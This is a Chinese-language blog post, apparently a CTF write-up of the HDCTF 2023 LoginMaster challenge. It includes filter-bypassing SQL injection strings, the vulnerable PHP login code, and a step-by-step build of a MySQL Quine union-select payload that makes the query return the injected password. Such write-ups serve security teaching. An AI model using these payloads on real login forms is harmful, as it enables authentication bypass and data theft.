@@ -1,0 +1,266 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>SQL注入之Quine | skkyblu3</title>
+<link rel="shortcut icon" href="https://skyblu3519.github.io/favicon.ico?v=1721054258675">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://skyblu3519.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="SQL注入之Quine | skkyblu3 - Atom Feed" href="https://skyblu3519.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="总结一下几天前的比赛。
+[HDCTF 2023]LoginMaster
+用户名给定admin，注入点在password。
+过滤了空格，password=0'/**/or/**/1#有回显差异。尝试用布尔盲注，过滤了substr用mid代替，..." />
+    <meta name="keywords" content="CTF,SQL注入" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://skyblu3519.github.io">
+  <img class="avatar" src="https://skyblu3519.github.io/images/avatar.png?v=1721054258675" alt="">
+  </a>
+  <h1 class="site-title">
+    skkyblu3
+  </h1>
+  <p class="site-description">
+    Welcome to Internet
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              SQL注入之Quine
+            </h2>
+            <div class="post-info">
+              <span>
+                2023-04-26
+              </span>
+              <span>
+                7 min read
+              </span>
+              
+                <a href="https://skyblu3519.github.io/tag/b7GKYdjmj/" class="post-tag">
+                  # CTF
+                </a>
+              
+                <a href="https://skyblu3519.github.io/tag/nWjlTAxCgi/" class="post-tag">
+                  # SQL注入
+                </a>
+              
+            </div>
+            
+              <img class="post-feature-image" src="https://skyblu3519.github.io/post-images/sql-zhu-ru-zhi-quine.png" alt="">
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <p>总结一下几天前的比赛。</p>
+<h1 id="hdctf-2023loginmaster">[HDCTF 2023]LoginMaster</h1>
+<p>用户名给定admin，注入点在password。</p>
+<p>过滤了空格，<code>password=0'/**/or/**/1#</code>有回显差异。尝试用布尔盲注，过滤了<code>substr</code>用<code>mid</code>代替，过滤了<code>=</code>用<code>like</code>代替。</p>
+<p>爆破得到库名，尝试报表。过滤<code>information</code>，测试<code>sys.schema_auto_increment_columns</code>、<code>sys.schema_table_statistics_with_buffer</code>、<code>mysql.innodb_table_stats</code>，只有<code>sys.schema_table_statistics_with_buffer</code>没有过滤，但查询这个表没有任何匹配，怀疑此表并不存在。</p>
+<p>猜测爆破表user字段password，出了结果，但是密码只有两个。构造<code>password=0'/**/or/**/mid(</code>password<code>)/**/like/**/'1'#</code>，尝试直接匹配查询出来的password，得到结果<code>04340343a018616055307f3b205c82b0</code>，以此作为密码输入但是不对。</p>
+<p>猜测爆破表user字段username，有三个用户，admin密码为空。</p>
+<p>至此游戏结束。</p>
+<h1 id="背后发生了什么">背后发生了什么</h1>
+<p>当时比较困惑的有两个：一个是后端逻辑是怎么做判断的；一个是直接匹配查询出来的password是哪里的数据。</p>
+<h2 id="后端代码">后端代码</h2>
+<p>从出题师傅那里拿到了这道题的源码，判断部分的代码如下：</p>
+<pre><code class="language-php">if (isset($_POST['username']) &amp;&amp; $_POST['username'] != '' &amp;&amp; isset($_POST['password']) &amp;&amp; $_POST['password'] != '') {
+    $username=$_POST['username'];
+    $password=$_POST['password'];
+    if ($username !== 'admin') {
+        alertMes('only admin can login', 'index.php');
+    }
+    checkSql($password);
+    $sql=&quot;SELECT password FROM users WHERE username='admin' and password='$password';&quot;;
+    $user_result=mysqli_query($con,$sql);
+    $row = mysqli_fetch_array($user_result);
+    if (!$row) {
+        alertMes(&quot;something wrong&quot;,'index.php');
+    }
+    if ($row['password'] === $password) {
+        die($FLAG);
+    } else {
+    alertMes(&quot;wrong password&quot;,'index.php');
+  }
+}
+</code></pre>
+<p>获得flag要使sql查询出来的<code>$row['password']</code>与输入的<code>$password</code>相等，而admin的password为空，如果输入空的password就会被第一个判断拦下。</p>
+<p>所以要构造一个查询出的结果，与输入的查询语句相同的sql查询。</p>
+<h2 id="反引号查询">反引号查询</h2>
+<p>在有了题目数据库的结构后，这个问题也明了了。<br>
+<img src="https://skyblu3519.github.io/post-images/1682493851547.png" alt="" loading="lazy"><br>
+<img src="https://skyblu3519.github.io/post-images/1682493860326.png" alt="" loading="lazy"><br>
+<code>password</code>这个反引号包裹的password返回的是user表的这个列，在这个匹配中<code>mid(</code>password<code>,1,1)='a'</code>只要这一列有满足要求的条目，就会返回这个条目。</p>
+<p>因此，<code>04340343a018616055307f3b205c82b0</code>其实是两个password条目的组合。所以只有在数据库只有一条记录时，这个方法才能在不知道表名的情况下查到对应的字段内容。</p>
+<h1 id="quine注入">Quine注入</h1>
+<p>MySQL 的 Quine 注入是一种自我复制的 SQL 注入攻击。Quine 是一种特殊类型的计算机程序，它的输出是其自身的源代码。类似地，Quine 注入是一种 SQL 注入攻击，它可以在被执行后生成与原始攻击相同的代码。</p>
+<p>在这里我们要<code>SELECT password FROM users WHERE username='admin' and password='$password';</code>查询的结果，与输入的<code>$password</code>相同，该如何操作呢？</p>
+<p>首先想到这里应该要构造一个联合查询的格式，因为这样在password判断失败的情况下，可以返回我们查询的结果。<br /><img src="https://skyblu3519.github.io/post-images/1682493903091.png" alt="" loading="lazy"></p>
+<p>这里构造 Quine 注入用到的是 replace 函数，replace 函数的用法也非常简单。</p>
+<pre><code># 它会在 str 中寻找 old_str 子串，用 new_str 来替换 old_str
+replace(str, old_str, new_str)
+</code></pre>
+<p>构造 Quine 的起点：<code>replace('replace(&quot;.&quot;, char(46), &quot;.&quot;)', char(46), 'replace(&quot;.&quot;, char(46), &quot;.&quot;)')</code>，其中的char(46)就是<code>.</code>，执行效果如下：</p>
+<pre><code>mysql&gt; select replace('replace(&quot;.&quot;, char(46), &quot;.&quot;)', char(46), 'replace(&quot;.&quot;, char(46), &quot;.&quot;)');
++---------------------------------------------------------------------------------+
+| replace('replace(&quot;.&quot;, char(46), &quot;.&quot;)', char(46), 'replace(&quot;.&quot;, char(46), &quot;.&quot;)') |
++---------------------------------------------------------------------------------+
+| replace(&quot;replace(&quot;.&quot;, char(46), &quot;.&quot;)&quot;, char(46), &quot;replace(&quot;.&quot;, char(46), &quot;.&quot;)&quot;) |
++---------------------------------------------------------------------------------+
+</code></pre>
+<p>这一过程究竟发生了什么？因为最后发生变化的是第一个字符串，其中会被替换的<code>.</code>用红色标出，替换用的字符串用蓝色标出：<br />replace(&quot;<font color=Red>.</font>&quot;, char(46), &quot;<font color=Red>.</font>&quot;)<br /><font color=Blue>replace(&quot;.&quot;, char(46), &quot;.&quot;)</font><br />replace(&quot;<font color=Blue>replace(&quot;.&quot;, char(46), &quot;.&quot;)</font>&quot;, char(46), &quot;<font color=Blue>replace(&quot;.&quot;, char(46), &quot;.&quot;)</font>&quot;)</p>
+<p>清晰许多了，结果也很相似。但是我们注意到，在构造查询的时候。闭合字符串用的单引号，与闭合<code>.</code>的双引号必须是不同的。而替换后原来字符串闭合<code>.</code>的双引号，又变到了闭合字符串的位置。这就导致了一些差别。</p>
+<p>下面的构造语句为：<code>replace(replace('replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)',char(34),char(39)),char(46),'replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)');</code></p>
+<pre><code>mysql&gt; mysql&gt; select replace(replace('replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)',char(34),char(39)),char(46),'replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)');
++------------------------------------------------------------------------------------------------------------------------------------------------------------+
+| replace(replace('replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)',char(34),char(39)),char(46),'replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)') |
++------------------------------------------------------------------------------------------------------------------------------------------------------------+
+| replace(replace('replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)',char(34),char(39)),char(46),'replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)') |
++------------------------------------------------------------------------------------------------------------------------------------------------------------+
+1 row in set (0.00 sec)
+
+</code></pre>
+<p>分析下这个查询的过程：<br />replace('replace(replace(&quot;<font color=Red>.</font>&quot;,char(34),char(39)),char(46),&quot;<font color=Red>.</font>&quot;)',char(34),char(39))<br />replace(replace(<font color=Blue>'</font><font color=Red>.</font><font color=Blue>'</font>,char(34),char(39)),char(46),<font color=Blue>'</font><font color=Red>.</font><font color=Blue>'</font>)<br />replace(replace('<font color=Blue>replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)</font>',char(34),char(39)),char(46),'<font color=Blue>replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)</font>')</p>
+<p>通过总结，Quine注入的构造格式可以是：<br />replace(replace('str',char(34),char(39)), char(46), 'str')<br />而str的基本格式，就是上面这个Quine格式中的str换成<code>.</code>，再将<code>'</code>换成<code>&quot;</code><br />replace(replace(&quot;.&quot;,char(34),char(39)), char(46), &quot;.&quot;)</p>
+<p>select password from users where username='admin' and password='1' union select replace(replace('str',char(34),char(39)), char(46), 'str');<br />1' union select replace(replace('str',char(34),char(39)), char(46), 'str');<br />1&quot; union select replace(replace(&quot;.&quot;,char(34),char(39)), char(46), &quot;.&quot;)<br />1' union select replace(replace('1&quot; union select replace(replace(&quot;.&quot;,char(34),char(39)), char(46), &quot;.&quot;)',char(34),char(39)), char(46), '1&quot; union select replace(replace(&quot;.&quot;,char(34),char(39)), char(46), &quot;.&quot;)');</p>
+<pre><code>mysql&gt; select password from users where username='admin' and password='1' union select replace(replace('1&quot; union select replace(replace(&quot;.&quot;,char(34),char(39)), char(46), &quot;.&quot;)',char(34),char(39)), char(46), '1&quot; union select replace(replace(&quot;.&quot;,char(34),char(39)), char(46), &quot;.&quot;)');
++------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+| password                                                                                                                                                                                                         |
++------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+| 1' union select replace(replace('1&quot; union select replace(replace(&quot;.&quot;,char(34),char(39)), char(46), &quot;.&quot;)',char(34),char(39)), char(46), '1&quot; union select replace(replace(&quot;.&quot;,char(34),char(39)), char(46), &quot;.&quot;)') |
++------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+1 row in set (0.00 sec)
+</code></pre>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#hdctf-2023loginmaster">[HDCTF 2023]LoginMaster</a></li>
+<li><a href="#%E8%83%8C%E5%90%8E%E5%8F%91%E7%94%9F%E4%BA%86%E4%BB%80%E4%B9%88">背后发生了什么</a>
+<ul>
+<li><a href="#%E5%90%8E%E7%AB%AF%E4%BB%A3%E7%A0%81">后端代码</a></li>
+<li><a href="#%E5%8F%8D%E5%BC%95%E5%8F%B7%E6%9F%A5%E8%AF%A2">反引号查询</a></li>
+</ul>
+</li>
+<li><a href="#quine%E6%B3%A8%E5%85%A5">Quine注入</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://skyblu3519.github.io/post/zhe-shi-ben-zhan-de-di-yi-pian-wen-zhang/">
+              <h3 class="post-title">
+                这是本站的第一篇文章
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://skyblu3519.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
